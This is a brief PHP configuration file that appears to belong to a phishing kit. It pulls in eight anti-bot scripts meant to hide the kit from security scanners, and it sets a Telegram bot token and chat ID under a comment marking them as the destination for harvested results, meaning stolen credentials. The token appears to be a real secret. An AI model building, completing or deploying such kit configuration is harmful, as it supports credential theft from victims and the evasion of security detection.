<?php

include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';

$email =""; 

//telgram rzlt
$api = "5408665734:AAERg3tIqM6tvmqIzY61o2zDRifu3FTq03o";
$chatid = "5550172241";


?>